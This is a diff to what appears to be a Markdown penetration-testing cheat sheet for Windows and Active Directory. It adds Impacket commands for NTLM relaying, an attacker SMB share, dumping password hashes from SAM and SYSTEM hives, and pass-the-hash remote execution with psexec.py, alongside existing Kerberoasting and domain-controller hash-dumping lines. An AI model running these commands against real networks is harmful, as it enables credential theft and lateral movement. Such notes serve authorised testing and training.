@@ -250,6 +250,7 @@ PS> powershell -nop -c "powershell command; powershell command...;"
 PS> powershell -command "Start-Process -Verb runas cmd"
 # check user
 PS> whoami /user
+PS> whoami /priv
 # check OS
 PS> wmic os list brief
 # check Windows Version
@@ -677,21 +678,26 @@ $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
 # -> Hashcat
 ```
+## ntlmrelayx.py
+```zsh
+$ ntlmrelayx.py -smb2support -t smb://XXX.XXX.XXX.XXX -debug
+```
+## smbserver.py
+```zsh
+$ smbserver.py -smb2support -username TestUser -password TestPassword TestRemoteAppearFolder TestLocalDirectory
+```
 ## secretsdump.py
 ```zsh
 $ secretsdump.py -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
 $ secretsdump.py -outputfile hoge-com_hashes -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
+$ secretsdump.py -sam sam.hive -system system.hive LOCAL
 $ ls hoge-com_hashes*
-```
-```
-## ntlmrelayx.py
-```zsh
-$ ntlmrelayx.py -smb2support -t smb://XXX.XXX.XXX.XXX -debug
 ```
 ## psexec.py
 tag: shell
 ```zsh
 $ psexec.py HOGE.com/piyo:'TestPassword'@XXX.XXX.XXX.XXX
+$ psexec.py -hashes TestLmHash:TestNtHash TestUser@XXX.XXX.XXX.XXX
 ```
 
 # Evil-WinRM
